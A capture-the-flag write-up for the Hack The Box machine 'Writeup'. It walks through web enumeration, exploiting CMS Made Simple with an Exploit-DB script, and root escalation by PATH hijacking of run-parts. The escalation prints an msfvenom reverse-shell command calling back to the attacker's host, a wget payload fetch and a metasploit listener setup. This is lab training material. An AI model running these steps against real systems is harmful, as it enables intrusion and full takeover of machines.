# Overview:

This machine was a good reminder to do the basics of enumeration - robots.txt is still used commonly in the wild to blacklist directories for bots to crawl, and definitely came in handy here.

The privesc was a challenge as none of my usual enumeration methods worked, but as a result I've now added pspy to my playbook to help better enumerate running processes on a target machine.

I personally don't think this should be rated as easy - the CMS exploit was a stab in the dark and the process for finding the privesc was also pretty niche, relying on a tool that not a lot of people know about. Medium - Hard is probably more appropriate for the average user of HTB.

Thanks to HTB and jkr for another great box to work through!

# Enumeration
As always, start with an nmap scan to identify listening ports and services:
```
root@kali:~# nmap -sS -sC -sV -vv -Pn -p- -oA /home/montana/Documents/hackthebox/writeup/allscan 10.10.10.138
```

Which provides us with...not a whole lot to go on:
```

## Port 80

Browsing to port 80, it's an ASCII art landing page, which makes a point of having supposedly been compiled with love in vi:

![index](https://opalsec.github.io/assets/images/writeup/index.png)

As the kids say (I think) - weird flex, but okay.

Part of my (and many others') standard enumeration is to crawl for common directories for additional information and a way in. For this, I turn to my trusty wfuzz query:
```
root@kali:~# wfuzz -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.138/FUZZ -c --hh 0 --hc 404 
```

Unfortunately for me, the creator of this VM has put in place DoS protection (Eeyore, an OG DoS protection script) that's tanking my enumeration in the early stages:
![block](https://opalsec.github.io/assets/images/writeup/block.png)

Before starting down the rabbithole of trying to figure out how to beat the DoS protection, I tried one more common check - what's in robots.txt?

Again, an easy way for an attacker to find a starting point for things to look at - the blacklisted directories that an admin doesn't want you to see.

![robot](https://opalsec.github.io/assets/images/writeup/robot.png)

Taking a look at it, it's just a dump of notes the author is supposedly planning on uploading at some stage. Again - the weird flex about the page being written in a text editor...or not?

![writeup](https://opalsec.github.io/assets/images/writeup/writeup.png)

Thinking in that vein, I had a look but couldn't find any trace of what it was made with, and didn't see how it'd be relevant to progressing on this machine. 

After trawling through the pages again and finding nothing, I fired up burp and browsed to the same pages and saw this cookie:

![cookie](https://opalsec.github.io/assets/images/writeup/cookie.png)

A quick google shows it's for a basic CMS called "CMS Made Simple". Searching in Exploit-DB, we can see there's a bunch of historical and recent exploits for this CMS:

![exploitdb](https://opalsec.github.io/assets/images/writeup/exploitdb.png)

Despite my best efforts, I was unable to find any version information, and the best indication I had was some pages had the copyright for CMS up to 2019 

![copyright](https://opalsec.github.io/assets/images/writeup/copyright.png)

Given this, I decided to work backwards through the exploits until I found one that worked - 46635.

# Exploitation

This was a very cool script, and running it with the --crack option took out the extra work that I'd otherwise have had to do with hashcat/JTR

![script](https://opalsec.github.io/assets/images/writeup/script.png)

The script iterates through characters to bruteforce the salt and hashed password, which it then cracks:

![pass](https://opalsec.github.io/assets/images/writeup/pass.png)

I then SSH'd on to get the contents of user.txt

# Privilege Escalation

Classic enumeration techniques like LinEnum.sh didn't help, and after a caving and asking for a hint on the HTB discord, I got a great hint from [Gorgamite](https://www.hackthebox.eu/home/users/profile/82774), who said I should download [a tool called pspy](https://github.com/DominicBreuker/pspy) and watch what happened when a user SSH'd in.

I downloaded it and hosted it on Kali with SimpleHTTPServer, and retrieved it with wget:
```
jkr@writeup:/tmp$ wget http://10.10.10.138:8000/pspy64; chmod +x pspy64; ./pspy64
```

Which showed me this:
```

```

Every time a user logged in, the run-parts program was run without a file-path specified. This is great for us, as leaves it open to search order hijacking, meaning if we place a malicious binary with the same name higher up in the $PATH, our program will run instead.

To do this is generated a simple Linux reverse shell using msfvenom, with the same name as the binary being run on the endpoint:
```
root@kali:/home/montana/Documents/hackthebox/writeup# msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.17 LPORT=1234 -f elf -o run-parts
```

The important part is to make sure this is dropped as high up in the $PATH variable as possible to ensure it's run instead of the legit binary. In this case when checking /usr/local, we have write permissions to both sbin and bin, but it looks like the creator of the VM stripped read access - just to make life difficult:

![write](https://opalsec.github.io/assets/images/writeup/write.png)

As we can write to /usr/local/sbin, which is the first path in the $PATH variable, I hopped over to the directory; hosted my exploit with SimpleHTTPServer, and retrieved it on the remote end with wget. 

```
jkr@writeup:/usr/local/sbin$ wget http://10.10.14.17:8000/run-parts; chmod +x run-parts
```

![wget](https://opalsec.github.io/assets/images/writeup/wget.png)

To force the endpoint to run my program, all I had to do was start an SSH connection in another terminal while listening on netcat.

Unfortunately while it did cause the program to run, the connection died as soon as I tried to enter a command.

I couldn't figure out why, so I decided to use metasploit's multi/handler to see if I'd have better luck with that:

```
# start the db if it's not already up, and launch msfconsole:
$> /usr/share/metasploit-framework/msfdb run

# select /multi/handler:
$> use /multi/handler

# configure it to listen on port 1234 on all interfaces with the same payload we used with msfvenom:
$> set LHOST 0.0.0.0
$> set LPORT 1234
$> set payload /linux/x64/shell/reverse_tcp

# kick it off:
$> run
```

Going through the same process of kicking our malicious binary off by starting an SSH session, we get a callback with a root shell:

![rootshell](https://opalsec.github.io/assets/images/writeup/rootshell.png)

There's no prompt which makes this ugly, but it's done the job - here's our flag:

![flag](https://opalsec.github.io/assets/images/writeup/flag.png)

P.S.: I'd also mention that while I didn't check what the /root/bin/cleanup.pl script was doing, it appeared to wipe my reverse shell periodically, meaning I'd have to ensure I re-downloaded it and spun up the SSH connection before it ran again.
